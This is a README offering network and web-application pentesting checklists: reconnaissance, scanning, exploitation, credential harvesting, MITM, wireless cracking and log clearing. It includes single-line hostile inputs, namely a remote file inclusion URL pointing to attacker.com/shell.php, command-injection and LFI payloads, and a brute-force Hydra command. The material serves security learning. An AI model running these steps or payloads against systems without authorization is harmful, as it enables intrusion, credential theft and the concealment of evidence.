# A-hacker-s-Checklist

Here's your checklist formatted for a `README.md` file:

```markdown
# Network Hacking/Pentesting Checklist

## 1. Initial Information Gathering
- [ ] Use **whois** to gather domain registration details.
- [ ] Perform **DNS enumeration** using `nslookup`, `dig`, or `dnsenum`.
- [ ] Check public-facing services with tools like **Shodan** or **Censys**.

## 2. Network Discovery
- [ ] Perform a **Ping sweep** using tools like `nmap -sn [network]` to identify live hosts.
- [ ] Use **Netdiscover** for ARP scans on local networks.
- [ ] Check for **active wireless networks** using `airodump-ng`.

## 3. Port Scanning
- [ ] Use **Nmap** for port scanning:
  - [ ] Basic TCP scan: `nmap -sS [target]`.
  - [ ] Scan all ports: `nmap -p- [target]`.
  - [ ] If network blocks ping: `nmap -Pn [target]`.
- [ ] Perform **UDP scanning**: `nmap -sU [target]`.

## 4. Service Detection
- [ ] Perform **Banner grabbing** using `netcat`, `nmap -sV`, or `Telnet`.
- [ ] Use **Nmap scripts**: `nmap --script=banner [target]`.

## 5. Vulnerability Scanning
- [ ] Use **Nessus** or **OpenVAS** to scan for vulnerabilities.
- [ ] Use **Nmap NSE scripts**: `nmap --script vuln [target]`.
- [ ] Perform **Metasploit** vulnerability scanning: `msfconsole -x 'db_nmap [target]'`.

## 6. Firewall & IDS Evasion
- [ ] Use **fragmentation**: `nmap -f [target]`.
- [ ] Use **decoy** IPs: `nmap -D RND:10 [target]`.
- [ ] Perform **slow scans**: `nmap -T0 [target]`.

## 7. Network Mapping
- [ ] Use **Nmap** with traceroute: `nmap --traceroute [target]`.
- [ ] Run **Netstat** on compromised machines.

## 8. Vulnerability Exploitation
- [ ] Use **Metasploit**: `searchsploit [service]`.
- [ ] Obtain exploits from **Exploit-DB** or **Rapid7**.

## 9. Privilege Escalation
- [ ] Search for **kernel exploits**: `searchsploit [kernel version]`.
- [ ] Use **LinPEAS** or **WinPEAS** to identify escalation vectors.
- [ ] Check **sudo privileges**: `sudo -l`.

## 10. Credential Harvesting
- [ ] Perform **MITM attacks** using `ettercap` or `Bettercap`.
- [ ] Extract hashes with **Mimikatz** or **Responder**.
- [ ] Crack passwords using **John the Ripper** or **Hashcat**.

## 11. Sniffing Traffic
- [ ] Capture traffic with **Wireshark**.
- [ ] Use **tcpdump**: `tcpdump -i eth0`.

## 12. ARP Spoofing
- [ ] Perform ARP poisoning with `arpspoof` or `ettercap`.
- [ ] Forward traffic: `echo 1 > /proc/sys/net/ipv4/ip_forward`.

## 13. DNS Spoofing
- [ ] Use **dnsspoof** to redirect DNS traffic.
- [ ] Hijack DNS queries.

## 14. Man-in-the-Middle (MITM) Attacks
- [ ] Use **Bettercap** or **Ettercap** for MITM.
- [ ] Intercept traffic using **SSLstrip**.

## 15. Wireless Network Attacks
- [ ] Capture WPA2 handshakes with **Airodump-ng**.
- [ ] Deauthenticate clients using **Aireplay-ng**.
- [ ] Crack WPA2 passwords using **Aircrack-ng**.

## 16. Brute Force and Dictionary Attacks
- [ ] Use **Hydra** to brute-force services (e.g., SSH, FTP).
- [ ] Use **Medusa** or **Patator** for dictionary attacks.

## 17. Social Engineering
- [ ] Use **SET (Social Engineering Toolkit)** for phishing.
- [ ] Clone websites for credential harvesting.

## 18. Post-Exploitation
- [ ] Dump password hashes: `mimikatz` or `samdump2`.
- [ ] Use **Netcat** or **Meterpreter** for reverse shells.

## 19. Covering Tracks
- [ ] Clear logs on Linux (`/var/log/*`) or Windows (`Event Viewer`).
- [ ] Use **Timestomp** to modify file timestamps.

## 20. Reporting & Documentation
- [ ] Document vulnerabilities, exploits, and impacts.
- [ ] Create a detailed report with screenshots and recommendations.

---

# Web Application Hacking/Pentesting Checklist

## 1. Initial Information Gathering
- [ ] Perform **Google Dorking**: `inurl:admin login`.
- [ ] Enumerate **subdomains** using **Sublist3r** or **Amass**.
- [ ] Use **whois** to gather domain details.

## 2. Directory & File Enumeration
- [ ] Use **Gobuster** or **Dirbuster** to find directories:
  ```bash
  gobuster dir -u [URL] -w [WORDLIST]

- [ ] Search for backup files (`.bak`, `.old`).

## 3. Identify Web Application Technologies
- [ ] Use **WhatWeb** or **Wappalyzer**.
- [ ] Run **Nmap** with `-sV` to detect web service versions.

## 4. SSL/TLS Analysis
- [ ] Test SSL configurations with **SSLscan** or **testssl.sh**.

## 5. Spider the Website
- [ ] Use **Burp Suite** or **OWASP ZAP** to spider the site.

## 6. Test for Input Fields
- [ ] Identify input fields (forms, search bars, login pages).
- [ ] Test for **SQL Injection** or **XSS**.

## 7. SQL Injection
- [ ] Manually test common payloads.
- [ ] Use **SQLMap** for automated SQL Injection:
  ```bash
  sqlmap -u [URL] --dbs
  

## 8. Cross-Site Scripting (XSS)
- [ ] Manually inject XSS payloads.
- [ ] Use **XSStrike** for advanced XSS scanning.

## 9. Cross-Site Request Forgery (CSRF)
- [ ] Check for CSRF tokens in forms.
- [ ] Use **Burp Suite's Intruder** to modify and replay requests.

## 10. Command Injection
- [ ] Test for command injection: `; ls`, `| whoami`.
- [ ] Automate with **Commix**.

## 11. File Inclusion (LFI & RFI)
- [ ] Test for Local File Inclusion (LFI): `../../etc/passwd`.
- [ ] Remote File Inclusion (RFI): `http://example.com/?file=http://attacker.com/shell.php`.

## 12. Test Authentication Mechanisms
- [ ] Use **Hydra** to brute-force login credentials:
  ```bash
  hydra -l admin -P /path/to/wordlist.txt [URL] http-post-form "/login:username=^USER^&password=^PASS^:Invalid Login"
  

## 13. Test Authorization
- [ ] Check for privilege escalation by accessing restricted pages.

## 14. Session Management Testing
- [ ] Test for **session fixation**.
- [ ] Modify session cookies to impersonate users.

## 15. Check for Weak Password Policies
- [ ] Use **Burp Suite's Intruder** or **Hydra** to brute-force passwords.

## 16. Test File Upload Features
- [ ] Attempt to upload a **reverse shell** through file uploads.

## 17. Inspect HTTP Headers
- [ ] Check for insecure headers using **Burp Suite**.

## 18. Test Websockets
- [ ] Analyze and tamper with **WebSocket** messages.

## 19. Test API Endpoints
- [ ] Fuzz API endpoints for security misconfigurations.

## 20. Report Findings
- [ ] Document all vulnerabilities with payloads and screenshots.
- [ ] Provide **remediation steps** and impacts.
```

> **Enjoy your journey of mastering ethical hacking!** 😎

---

> **Enjoy your journey of mastering hacking!** 😎

> **Follow on Linkedin for more:https://www.linkedin.com/in/m-zeeshan-zafar-9205a1248/**
---
